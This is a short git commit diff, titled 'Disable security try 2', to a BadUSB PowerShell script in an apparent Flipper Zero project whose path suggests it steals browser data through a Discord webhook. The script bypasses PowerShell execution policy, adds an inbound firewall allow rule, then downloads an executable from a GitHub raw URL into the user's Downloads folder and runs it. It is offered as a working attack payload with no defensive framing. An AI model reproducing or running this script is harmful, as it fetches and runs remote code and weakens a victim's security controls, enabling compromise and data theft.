27da67317c34aba74b0b813ad565605b39d5f895
Chris <christophe.da.cruz.tic@gmail.com>
2024-01-27 12:12:09 +0100

    Disable security try 2

--- badusb/BrowserData/discord_wh_windows.ps1
+++ badusb/BrowserData/discord_wh_windows.ps1
@@ -1,5 +1,7 @@
-Set-ExecutionPolicy Bypass -Scope Process -Force
+$ruleName="testRuleWindows"
 $url="https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/windows64.exe"
 $destination=[System.IO.Path]::Combine($env:UserProfile, 'Downloads', 'windows64.exe')
+New-NetFirewallRule -DisplayName $ruleName -Direction Inbound -Program $executablePath -Action Allow
+Set-ExecutionPolicy Bypass -Scope Process -Force
 Invoke-WebRequest -Uri $url -OutFile $destination
 Start-Process -FilePath $destination -Wait
